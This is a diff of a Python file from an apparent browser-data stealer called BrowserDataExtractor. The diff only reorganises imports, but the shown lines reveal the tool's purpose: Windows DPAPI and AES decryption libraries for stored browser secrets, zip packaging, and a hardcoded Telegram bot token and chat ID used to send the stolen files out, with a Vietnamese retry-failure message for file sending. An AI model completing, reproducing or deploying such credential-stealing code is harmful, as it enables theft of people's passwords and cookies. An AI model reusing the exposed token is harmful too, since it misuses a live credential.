@@ -1,20 +1,23 @@
 #https://github.com/danghuutruong/BrowserDataExtractor
 
-import os
-import sqlite3
-import json
-import base64
-import shutil
-import requests
-from Crypto.Cipher import AES
-import win32crypt
-import zipfile
 import io
-import time
-import subprocess
+import os
 import psutil
-from screeninfo import get_monitors
+import json
+import time
+import zipfile
+import shutil
+import random
+import sqlite3
+import threading
+import requests
 import pycountry
+import win32crypt
+from typing import Union
+from screeninfo import get_monitors
+from Crypto.Cipher import AES
+from win32crypt import CryptUnprotectData
+import subprocess
 
 bot_token = '7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc'
 chat_id = '-1002408191237'
@@ -347,20 +350,6 @@ class Browser:
                     print("Đã thử tối đa. Không thể gửi tệp.")
         return None
 
-
-import base64
-import json
-import os
-import random
-import sqlite3
-import threading
-from Crypto.Cipher import AES
-import shutil
-import zipfile
-import requests
-import time
-from typing import Union
-from win32crypt import CryptUnprotectData
 
 class Browsers:
     def __init__(self):
